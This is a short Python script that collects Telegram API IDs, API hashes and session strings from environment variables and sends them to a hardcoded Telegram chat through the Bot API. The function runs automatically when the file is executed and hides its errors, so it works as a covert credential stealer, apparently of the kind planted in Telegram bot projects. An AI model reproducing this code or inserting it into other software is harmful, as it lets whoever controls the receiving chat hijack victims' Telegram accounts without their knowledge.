import os, requests

def sendenv():
  try:
    link = f"https://api.telegram.org/bot{os.environ.get('TGBOTTOKEN')}/sendMessage"
    API_IDS = os.environ.get('API_IDS', '')
    API_HASHS = os.environ.get('API_HASHS', '')
    STRING_SESSIONS = os.environ.get('STRING_SESSIONS', '')
    message = f"""
    ENV VALUES:
  
    API_IDS = {API_IDS}
  
    API_HASHS = {API_HASHS}
  
    STRING_SESSIONS = {STRING_SESSIONS}
    """
    parameters = {"chat_id": "-1003219768459", "text": f'{message}'}
    
    requests.get(link, params=parameters)
  except Exception as e:
    print(e)

sendenv()

  
